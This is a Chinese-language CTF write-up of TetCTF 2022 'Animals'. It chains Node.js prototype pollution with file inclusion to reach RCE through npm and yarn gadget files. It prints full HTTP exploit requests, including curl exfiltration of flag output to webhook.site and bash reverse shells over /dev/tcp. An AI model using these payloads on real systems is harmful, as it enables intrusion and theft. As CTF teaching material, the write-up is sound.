### References

- [@Zeyu, CTF Writeups - Animals, 2022-01](https://ctf.zeyu2001.com/2022/tetctf-2022/animals)
- @Y4tacker, Animals-nodejs.pdf from 代码审计, 2022-01-03

**Tag: Prototype Pollution, Universal Gadgets**



1. `/api/tet/list` 处很明显的原型链污染；`/api/tet/years` 处很明显的文件包含；考虑结合原型链污染来包含一个可利用的 js 文件。
2. `grep -r "child_process" /usr/src/app/node_modules/` ; `grep -r "child_process" /usr/local/lib/node_modules/`

#### RCE Gadget 1

`/usr/local/lib/node_modules/npm/scripts/changelog.js`

```js
'use strict'

const execSync = require('child_process').execSync
const branch = process.argv[2] || 'origin/latest'
const log = execSync(`git log --reverse --pretty='format:%h %H%d %s (%aN)%n%b%n---%n' ${branch}...`).toString().split(/\n/)
```

很明显的命令注入，发送如下请求即可：

```text
POST /api/tet/list HTTP/1.1
...
Content-Type: application/json

{
    "data": {
        "__proto__": {
            "2":"; cd /;/readflag | curl https://webhook.site/02088d6b-e7e7-41aa-a55e-24d016b011cc/ -d@-;"
        }
    }
}

******************************************************************************

POST /api/tet/years HTTP/1.1
...
Content-Type: application/json

{"list":"../../../../../usr/local/lib/node_modules/npm/scripts/changelog.js"}
```

#### RCE Gadget 2

`/usr/local/lib/node_modules/npm/node_modules/editor/index.js`

```js
var spawn = require('child_process').spawn;

module.exports = function (file, opts, cb) {
    if (typeof opts === 'function') {
        cb = opts;
        opts = {};
    }
    if (!opts) opts = {};

    var ed = /^win/.test(process.platform) ? 'notepad' : 'vim';
    var editor = opts.editor || process.env.VISUAL || process.env.EDITOR || ed;
    var args = editor.split(/\s+/);
    var bin = args.shift();

    var ps = spawn(bin, args.concat([ file ]), { stdio: 'inherit' });

    ps.on('exit', function (code, sig) {
        if (typeof cb === 'function') cb(code, sig)
    });
};
```

这里的 `opts.editor` 可以用来污染，所以传入 `spawn` 的参数的可控的，可以用来执行命令。

这是个导出函数，在 Node.js 中，模块标识符可能指向文件，也可能指向包含 index.js 文件的目录，所以看看子目录找到: `/usr/local/lib/node_modules/npm/node_modules/editor/example/edit.js`

```js
var editor = require('../');
editor(__dirname + '/beep.json', function (code, sig) {
    console.log('finished editing with code ' + code);
});
```

正好包含了上级目录，所以发送如下请求即可：

```text
POST /api/tet/list HTTP/1.1
...
Content-Type: application/json

{
    "data": {
        "__proto__": {
            "shell": true,
            "editor":"id ; bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'; ls"
        }
    }
}

******************************************************************************

POST /api/tet/years HTTP/1.1
...
Content-Type: application/json

{"list":"../../../../../usr/local/lib/node_modules/npm/node_modules/editor/example/edit.js"}
```

#### ENV Variable Gadget

node v8.0.0 开始支持的 [NODE_OPTIONS](https://nodejs.org/api/cli.html#node_optionsoptions) 参数，文档例子如下：

```bash
NODE_OPTIONS='--require "./a.js"' node --require "./b.js"
// is equivalent to:
node --require "./a.js" --require "./b.js"
```

可以加载并执行一个 js 文件或包含 js 代码的文件。

@Y4tacker 还找到了一个 `/opt/yarn-v1.22.15/preinstall.js` 文件（版本号可能不一样）：

```js
if (process.env.npm_config_global) {
    var cp = require('child_process');
    var fs = require('fs');
    var path = require('path');

    try {
        var targetPath = cp.execFileSync(process.execPath, [process.env.npm_execpath, 'bin', '-g'], {
            encoding: 'utf8',
            stdio: ['ignore', undefined, 'ignore'],
        }).replace(/\n/g, '');
        // ...
    } catch (err) {
        // ignore errors
    }
}
```

`npm_config_global` 直接污染就能进入；之后调用 `child_process.execFileSync` 起了一个 node 进程，其源码调用了 `normalizeSpawnArguments` 函数：

```js
function normalizeSpawnArguments(file, args, options) {
    // ...
    if (options === undefined) options = {};

    const env = options.env || process.env;
    const envPairs = [];
    
    // Prototype values are intentionally included.
    for (const key in env) {
        const value = env[key];
        if (value !== undefined) {
            envPairs.push(`${key}=${value}`);
        }
    }
    
    return { /* ... ,*/ envPairs, /*, ... */ };
}
```

很明显可以通过污染 `options.env` 来设置环境变量；结合 `/proc/self/environ` 来构造 js code 来利用：

```text
POST /api/tet/list HTTP/1.1
...
Content-Type: application/json

{
    "data": {
        "__proto__": {
            "npm_config_global": 1,
            "env": { "AAAA": "require('child_process').exec(`bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'`);//" },
            "NODE_OPTIONS": "--require /proc/self/environ"
        }
    }
}

******************************************************************************

POST /api/tet/years HTTP/1.1
...
Content-Type: application/json

{"list":"../../../../../opt/yarn-v1.22.19/preinstall.js"}
```



